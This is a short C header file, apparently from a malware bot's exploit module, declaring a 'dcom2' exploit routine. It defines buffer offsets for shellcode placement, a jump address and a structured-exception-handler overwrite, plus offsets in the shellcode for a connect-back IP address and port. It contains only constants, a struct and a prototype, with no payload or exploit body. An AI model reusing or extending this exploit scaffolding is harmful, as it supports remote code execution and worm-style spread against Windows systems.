#ifndef NO_DCOM2

#define DCOM2_SCBUF_OFFSET_SC		0x24	// Offset for shellcode in the buffer
#define DCOM2_SCBUF_BUF_MAX			0x208	// Maximimum number of bytes in shellcode
#define DCOM2_SCBUF_OFFSET_JMP_ADDR	DCOM2_SCBUF_BUF_MAX+DCOM2_SCBUF_OFFSET_SC+0x8
											// Offset for the jump address
#define DCOM2_SCBUF_OFFSET_TOP_SEH	DCOM2_SCBUF_OFFSET_JMP_ADDR+0x4
											// Offset for the top of the structured
											// exception handler

#define DCOM2_SHELLCODE_OFFSET_IP	0x16D	// Offset for the IP to connect to
#define DCOM2_SHELLCODE_OFFSET_PORT	0x171	// Offset for the port to connect to

typedef struct dcom2_offset_s
{	
	unsigned long lTopSEH;
	unsigned long lJmpAddr;

} dcom2_offset;

bool dcom2(EXINFO einfo);
#endif